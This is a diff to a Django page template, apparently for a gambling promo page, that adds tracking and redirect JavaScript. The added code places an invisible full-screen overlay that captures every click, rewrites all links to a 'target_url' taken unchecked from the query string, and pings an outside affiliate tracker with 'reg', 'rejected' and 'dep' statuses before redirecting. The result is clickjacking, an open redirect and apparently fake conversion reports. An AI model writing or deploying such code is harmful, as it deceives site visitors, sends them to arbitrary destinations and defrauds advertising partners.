@@ -442,96 +442,103 @@
 <script src="{% static 'assets/js/read-more.js' %}"></script>
 
 {% if is_promo %}
-<div id="promo">
-{#    <div class="btn btn-lg position-relative top-50 start-50 btn-primary shadow-primary translate-middle">#}
-{#        Мне есть 18 лет#}
-{#    </div>#}
-</div>
-<style>
-    #promo{
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0);
-        z-index: 100;
-    }
-</style>
+    <div id="promo">
+    {#    <div class="btn btn-lg position-relative top-50 start-50 btn-primary shadow-primary translate-middle">#}
+    {#        Мне есть 18 лет#}
+    {#    </div>#}
+    </div>
+    <style>
+        #promo{
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0);
+            z-index: 100;
+        }
+    </style>
     <script>
 
-    function getQueryParam(param) {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get(param);
-    }
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
 
-    const targetUrl = getQueryParam('target_url');
-    const clickId = getQueryParam('click_id');
-    const secondId = getQueryParam('second_id');
+        const targetUrl = getQueryParam('target_url');
+        const secondId = getQueryParam('second_id');
 
-    const oneMonthInSeconds = 30 * 24 * 60 * 60;
+        const oneMonthInSeconds = 30 * 24 * 60 * 60;
 
-    if (clickId) {
-        document.cookie = `click_id=${clickId}; path=/; max-age=${oneMonthInSeconds}`;
-    }
-    if (secondId) {
-        document.cookie = `second_id=${secondId}; path=/; max-age=${oneMonthInSeconds}`;
-    }
-    if (targetUrl) {
-        document.cookie = `target_url=${targetUrl}; path=/; max-age=${oneMonthInSeconds}`;
-    }
+        if (secondId) {
+            document.cookie = `second_id=${secondId}; path=/; max-age=${oneMonthInSeconds}`;
+        }
+        if (targetUrl) {
+            document.cookie = `target_url=${targetUrl}; path=/; max-age=${oneMonthInSeconds}`;
+        }
 
-    document.getElementById('promo').addEventListener('click', function (){
-        window.location.href = targetUrl;
-    })
-
-    const links = document.querySelectorAll('a');
-    links.forEach(link => {
-        link.href = targetUrl
-
-        link.addEventListener('click', (event) => {
+        document.getElementById('promo').addEventListener('click', function (event) {
             event.preventDefault();
-
-            fetch('https://chilling.miami-beach.fun/a1a7400/postback?subid=' + secondId + '&status=rejected', {
+            fetch('https://chilling.miami-beach.fun/a1a7400/postback?subid=' + secondId + '&status=reg', {
                 method: 'GET',
             })
             .then(response => {
                 if (response.ok) {
-                    window.location.href = link.href;
+                    window.location.href = targetUrl;
                 }
             })
         });
-    })
 
-
-
+        const links = document.querySelectorAll('a');
+        links.forEach(link => {
+            link.href = targetUrl
+            link.addEventListener('click', (event) => {
+                event.preventDefault();
+                fetch('https://chilling.miami-beach.fun/a1a7400/postback?subid=' + secondId + '&status=rejected', {
+                    method: 'GET',
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = link.href;
+                    }
+                })
+            });
+        })
     </script>
 {% endif %}
 
 <script>
-
     function getCookie(name) {
         const value = `; ${document.cookie}`;
         const parts = value.split(`; ${name}=`);
         if (parts.length === 2) return parts.pop().split(';').shift();
     }
 
-    const clickId = getCookie('click_id');
     const secondId = getCookie('second_id');
     const targetUrl = getCookie('target_url');
 
-    if (clickId || secondId || targetUrl) {
+    if (secondId) {
         const links = document.querySelectorAll('a[href*="/play/"]');
         links.forEach(link => {
             const url = new URL(link.href);
-
-            if (secondId) {
-                url.searchParams.set('second_id', secondId);
-            }
-
+            url.searchParams.set('second_id', secondId);
             link.href = url.toString();
+
+            link.addEventListener('click', (event) => {
+                event.preventDefault();
+                fetch('https://chilling.miami-beach.fun/a1a7400/postback?subid=' + secondId + '&status=dep', {
+                    method: 'GET',
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = link.href; // Переход на href ссылки
+                    }
+                })
+            });
+
         });
     }
+
 </script>
 
 <script>
